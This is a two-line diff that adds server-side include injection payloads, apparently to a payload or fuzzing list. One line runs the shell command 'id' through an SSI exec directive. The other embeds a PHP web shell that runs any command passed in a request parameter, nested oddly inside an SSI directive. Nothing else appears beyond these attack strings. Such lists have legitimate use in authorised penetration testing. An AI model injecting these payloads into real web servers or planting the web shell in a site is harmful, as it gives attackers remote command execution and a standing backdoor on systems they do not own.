@@ -1,0 +1,2 @@
+<!--#exec cmd="id" -->
+<!--#exec cmd="<?php system($_REQUEST['cmd']); ?>" -->
